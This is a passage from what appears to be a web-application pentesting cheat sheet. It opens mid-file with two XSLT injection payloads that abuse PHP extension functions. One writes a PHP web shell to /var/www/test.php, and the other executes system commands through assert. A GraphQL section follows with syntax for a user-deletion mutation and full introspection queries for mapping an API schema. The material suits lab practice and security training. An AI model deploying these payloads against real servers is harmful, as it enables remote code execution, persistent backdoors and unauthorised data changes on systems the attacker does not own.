    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl" xsl:extension-element-prefixes="php">
   <xsl:variable name="cde"><![CDATA[<?php system('whoami'); ?>]]></xsl:variable>
    <xsl:template match="/">
        <html>
            <body><xsl:value-of select="php:function('file_put_contents','/var/www/test.php',$cde)" /></body>
        </html>
    </xsl:template>
</xsl:stylesheet>
```

```xsl
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl" xsl:extension-element-prefixes="php">
    <xsl:variable name="cde"><![CDATA[system('whoami');]]></xsl:variable>
    <xsl:template match="/">
        <html>
            <body><xsl:value-of select="php:function('assert',$cde)" /></body>
        </html>
    </xsl:template>
</xsl:stylesheet>
```

## GraphQL hints

* [Documentation & additional hints](https://portswigger.net/web-security/graphql)

üí° Syntax to use when an argument is an **object**:

`input: {field1_name: field1_value, field2_name: field2_value}`

üíª Example:

```text
mutation{
 deleteOrganizationUser(input: {id: 3}){
  user{username}
 }
}  
```

üí° Discovery queries to obtains the **schema non-detailed** :

```text
{
    __schema {
        types {
            name
            kind
            description
            fields {
                name
            }
        }
    }
}
```

üí° Discovery queries to obtains the **schema detailed** :

```text
 query IntrospectionQuery {
  __schema {
   queryType {
    name
   }
   mutationType {
    name
   }
   subscriptionType {
    name
   }
   types {
    ...FullType
   }
   directives {
    name
    description
    locations
    args {
     ...InputValue
    }
   }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
   name
   description
   args {
    ...InputValue
   }
   type {
    ...TypeRef
   }
   isDeprecated
   deprecationReason
  }
  inputFields {
   ...InputValue
  }
  interfaces {
   ...TypeRef
  }
  enumValues(includeDeprecated: true) {
   name
   description
   isDeprecated
   deprecationReason
  }
  possibleTypes {
   ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
   ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
   kind
   name
   ofType {
    kind
    name
    ofType {
     kind
     name
     ofType {
      kind
      name
      ofType {
       kind
       name
       ofType {
        kind
        name
        ofType {
         kind
         name
        }
       }
      }
     }
    }
   }
  }
}
```
